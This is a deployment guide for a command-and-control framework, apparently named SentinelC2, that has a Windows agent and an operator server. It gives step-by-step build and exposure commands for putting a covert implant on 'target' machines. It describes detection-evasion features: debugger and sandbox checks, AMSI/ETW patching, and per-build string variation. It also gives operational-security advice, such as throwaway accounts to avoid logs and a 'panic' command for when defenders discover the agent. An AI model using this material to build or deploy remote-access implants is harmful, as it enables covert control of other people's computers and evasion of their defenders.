# SentinelC2 — Deployment Guide (Real Internet on a Target Device)

This guide covers how to put the C2 on the public internet so agents on
remote targets can reach it.

## Architecture

```
[Target machine]               [Public internet]            [Operator's box]
 agent.exe (Windows)     <---->     WSS        <---->  Tailscale Funnel
   |                                                       |
   |  outbound TCP 443                                     |  inbound HTTPS
   |  WSS upgrade via Tailscale cert                       |  Tailscale Funnel
   |                                                       |  proxies to
   |                                                       |  c2_server.exe
   |                                                       |  ws://localhost:8443
   v                                                       v
 [C2 dashboard]                                        [operator browser
  http://localhost:8080                                  -> http://localhost:8080]
```

The key insight: **the target only needs outbound HTTPS to a public host**.
The operator handles TLS termination, cert management, and exposure.

## Why Tailscale Funnel

| Option | Pros | Cons |
|---|---|---|
| Tailscale Funnel | Free, public HTTPS, Tailscale cert, no DNS to manage | Routes through Tailscale's edge (logged) |
| Cloudflare in front of c2 | Real cert, your domain | Need a domain + Cloudflare account |
| nginx + Let's Encrypt on operator box | Full control | Need a domain, cert renewal, public IP |

**Tailscale Funnel is the fastest path to a real-internet test.** It's also
the right choice for actual engagements when paired with a throwaway
Tailscale account.

## Setup (Tailscale Funnel)

### 1. Operator box — install + configure Tailscale

```powershell
# Install
winget install Tailscale.Tailscale

# Auth
tailscale up

# Note your Tailscale hostname
tailscale status
# Example: desktop-o31lvpe.tail4b2f2a.ts.net
```

### 2. C2 server (operator box)

Edit `c2_server.nim`:
- `LISTEN_HOST = "127.0.0.1"` (Funnel proxies to localhost)
- `LISTEN_PORT = 8443`
- `WEB_PORT = 8080`
- `WEB_AUTH_USER` / `WEB_AUTH_PASSWORD` — **set a real password** for engagement use

Build and run:
```powershell
nim c -d:release -d:ssl --threads:on --opt:speed c2_server.nim
.\c2_server.exe
```

### 3. Tailscale Funnel

Expose the c2's WebSocket port to the public internet:
```powershell
tailscale serve --bg https+insecure://localhost:8443
tailscale funnel 8443 on
```

Verify the public URL:
```powershell
tailscale funnel status
# Should show: https://<your-host>.ts.net -> http://localhost:8443
```

The agent's URL is then: `wss://<your-host>.ts.net/`

### 4. Agent (target machine)

Edit `agent.nim`:
```nim
const C2_URLS* = @["wss://<your-host>.ts.net/"]
```

Build:
```powershell
nim c -d:release -d:ssl --opt:size --app:gui --passL:-s agent.nim
```

Copy `agent.exe` to the target. Run it. It makes an outbound HTTPS
connection to Tailscale's edge, Tailscale terminates TLS and proxies
to your c2 over the local Tailscale network.

## Security

- **Web dashboard:** Basic auth at `WEB_AUTH_USER`/`WEB_AUTH_PASSWORD`.
  Change these per deployment. The browser will prompt for credentials
  on first load.
- **TLS:** Tailscale handles the public-facing cert (their wildcard
  for `*.ts.net`). All traffic between agent and Tailscale edge is
  HTTPS; from edge to c2 it's the Tailscale mesh (WireGuard, also
  encrypted).
- **Auth secret:** `AGENT_SECRET` in `agent.nim` and `SECRET` in
  `c2_server.nim` must match. The agent proves knowledge of this
  secret in the registration HMAC, but the session key is derived
  per-connection from the nonces, not from `AGENT_SECRET`. Still,
  rotate per engagement.
- **Anti-analysis:** the agent checks for debuggers, sandbox
  markers, and clock-tampering at startup. Bails silently if hostile.

## Testing locally (no internet)

`ws://127.0.0.1:8443` works without Tailscale. The dashboard is at
`http://localhost:8080`. Useful for development.

## Testing on real internet (one box + another)

1. Run c2 on your main box, set up Tailscale Funnel
2. Build agent with `C2_URLS = wss://<your-host>.ts.net/`
3. Copy agent to the second laptop
4. Run agent on the second laptop
5. Open dashboard on your main box: `http://localhost:8080/`
6. Auth with `WEB_AUTH_USER`/`WEB_AUTH_PASSWORD`
7. The second laptop should appear in the agent list

## Engagement / production checklist

- [ ] Rotate `AGENT_SECRET` / `SECRET`
- [ ] Set strong `WEB_AUTH_USER` / `WEB_AUTH_PASSWORD`
- [ ] Build with `--define:BuildPrefix="<unique>"` to vary the
      `X7K` magic strings per build
- [ ] Run c2 on a clean host (not your daily-driver machine)
- [ ] Use a throwaway Tailscale account if real engagement —
      Tailscale Funnel logs at their edge
- [ ] Forward / archive `logs/<agent_id>.log` per session
- [ ] Set `killdate` on agents at end of engagement so they self-destruct
- [ ] Use `panic` command if a target is lost to the blue team

## Known limitations (as of v3)

- No forward secrecy (X25519) — `AGENT_SECRET` compromise decrypts
  past sessions if you also have the captured traffic. Plan to
  add this.
- AMSI/ETW patches are detectable by modern EDRs
- The agent has a known bug in its recv loop where commands
  don't always get processed within BEACON_INTERVAL
- No anti-debug for kernel-mode debuggers
- No heap encryption / sleep obfuscation

## If you need real TLS termination (without Tailscale Funnel)

The c2 server is plain WS. To use a real public cert + your own
domain, put a TLS terminator in front:

### Cloudflare

1. Put the c2 behind a Cloudflare-tunneled origin
2. Cloudflare Tunnel + `cloudflared` provides HTTPS without a public IP
3. Set `C2_URLS = wss://your.domain/`

### nginx + Let's Encrypt

1. `c2_server` listens on `127.0.0.1:8443`
2. nginx terminates TLS on `:443`, proxies to `127.0.0.1:8443` with
   `proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection "upgrade";`
3. Use certbot for cert renewal
4. Set `C2_URLS = wss://your.domain/`

In both cases, the agent doesn't change — it just talks WSS to the
public hostname.
